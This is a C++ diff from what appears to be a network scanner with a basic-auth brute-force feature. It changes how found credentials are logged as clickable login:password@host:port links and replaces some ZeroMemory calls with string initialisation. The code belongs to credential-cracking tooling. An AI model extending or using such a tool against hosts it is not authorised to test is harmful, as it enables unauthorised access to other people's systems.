@@ -30,7 +30,8 @@ std::string toLowerStr(const char *str)
 	if (str != NULL) {
 		int tsz = strlen(str);
 		char *strr = new char[tsz + 1];
-		ZeroMemory(strr, tsz);
+		//ZeroMemory(strr, tsz);
+		strr[0] = 0;
 
 		for (int i = 0; i < tsz; i++)
 		{
@@ -808,7 +809,8 @@ void putInFile(int flag, const char *ip, int port, int size, const char *finalst
 
     fputsf (log, flag, msg);
 
-	ZeroMemory(msg, strlen(msg));
+	//ZeroMemory(msg, strlen(msg));
+	msg[0] = 0;
 }
 
 void _specFillerBA(const char *ip, int port, const char *finalstr, const char *login, const char *pass, int flag)
@@ -816,13 +818,34 @@ void _specFillerBA(const char *ip, int port, const char *finalstr, const char *l
     char log[512] = {0};
 	
 	++PieBA;
+	int offset = 0;
+
+	if (strstri(ip, "https://") != NULL) {
+		offset = 8;
+	}
+	else if (strstri(ip, "http://") != NULL) {
+		offset = 7;
+	}
+
 	if (strlen(login) > 0 || strlen(pass) > 0)
     {
-        sprintf(log, "[BA]:<span id=\"hostSpan\"><a href=\"%s:%s@%s:%d\"><font color=MediumSeaGreen>%s:%s@%s:%d</font></a></span> T: <font color=GoldenRod>%s</font>\n",
-                login, pass, ip, port, login, pass, ip, port, finalstr);
+		if (8 == offset) {
+			sprintf(log, "[BA]:<span id=\"hostSpan\"><a href=\"https://%s:%s@%s:%d\"><font color=MediumSeaGreen>%s:%s@%s:%d</font></a></span> T: <font color=GoldenRod>%s</font>\n",
+				login, pass, ip + offset, port, login, pass, ip + offset, port, finalstr);
+		}
+		else {
+			sprintf(log, "[BA]:<span id=\"hostSpan\"><a href=\"http://%s:%s@%s:%d\"><font color=MediumSeaGreen>%s:%s@%s:%d</font></a></span> T: <font color=GoldenRod>%s</font>\n",
+				login, pass, ip + offset, port, login, pass, ip + offset, port, finalstr);
+		}
     } else {
-        sprintf(log, "[BA]:<span id=\"hostSpan\"><a href=\"%s:%d\"><font color=MediumSeaGreen>%s:%d</font></a></span> T: <font color=GoldenRod>%s</font>\n",
-                ip, port, ip, port, finalstr);
+		if (8 == offset) {
+			sprintf(log, "[BA]:<span id=\"hostSpan\"><a href=\"https://%s:%d\"><font color=MediumSeaGreen>%s:%d</font></a></span> T: <font color=GoldenRod>%s</font>\n",
+				ip + offset, port, ip + offset, port, finalstr);
+		}
+		else {
+			sprintf(log, "[BA]:<span id=\"hostSpan\"><a href=\"http://%s:%d\"><font color=MediumSeaGreen>%s:%d</font></a></span> T: <font color=GoldenRod>%s</font>\n",
+				ip + offset, port, ip + offset, port, finalstr);
+		}
     }
 
 	stt->doEmitionFoundData(QString::fromLocal8Bit(log));
@@ -1228,7 +1251,7 @@ int _specBrute(const char *ip, int port,
 	
 	if (strcmp(lps.other, "404") == 0) {
 
-		stt->doEmitionRedFoundData("BA - 404 <a style=\"color:#717171;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + QString(path) + "/\">" +
+		stt->doEmitionRedFoundData("BA - 404 <a style=\"color:#717171;\" href=\"" + QString(ip) + ":" + QString::number(port) + QString(path) + "/\">" +
 			QString(ip).mid(0, QString(ip).indexOf("/")) + ":" + QString::number(port) + QString(path) + "</a>");
 		return -1;
 	}
@@ -1812,11 +1835,11 @@ void _getLinkFromJSLocation(char *dataBuff, char *str, char *tag, char *ip, int 
 						sz = ptrQuoteTemp - ptrQuote1 + 1;
 					}
 					char *tempBuff = new char[sz + 1];
-                    ZeroMemory(tempBuff, sizeof(*tempBuff));
+                    //ZeroMemory(tempBuff, sizeof(*tempBuff));
+					tempBuff[0] = 0;
 					strncpy(tempBuff, ptrQuote1 + 1, sz);
 					memset(tempBuff + sz, 0, 1);
 					char delim[2] = {0};
-					ZeroMemory(delim, 1);
 					delim[0] = ptrQuote1[0];
 					delim[1] = '\0';
 
